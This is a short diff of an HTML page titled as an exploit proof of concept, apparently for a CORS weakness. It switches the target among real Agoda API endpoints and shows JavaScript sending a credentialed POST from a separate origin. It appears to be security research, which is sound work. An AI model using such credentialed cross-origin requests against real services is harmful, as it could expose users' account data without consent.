@@ -48,7 +48,7 @@
 
 <div class="box">
     <h2>Exploit Proof-of-Concept (POST Method)</h2>
-    <p>Target: <code>https://www.agoda.com/api/cronos/layout/PageHeaderApi/UserMenuViewModel</code></p>
+    <p>Target: <code>https://www.agoda.com/api/gw/Cms/Lookup?</code></p>
     <p>Source Origin: <code>https://stelemane.github.io/poc-site/</code></p>
     <p>Method: <code>POST</code></p>
     
@@ -61,7 +61,7 @@
         const statusDiv = document.getElementById('status');
         const outputDiv = document.getElementById('output');
         
-        const target = "https://www.agoda.com/api/cronos/layout/notification/get";
+        const target = "https://www.agoda.com/api/gw/Cms/Lookup?";
 
         statusDiv.innerText = "[*] Sending POST request with Credentials...";
 
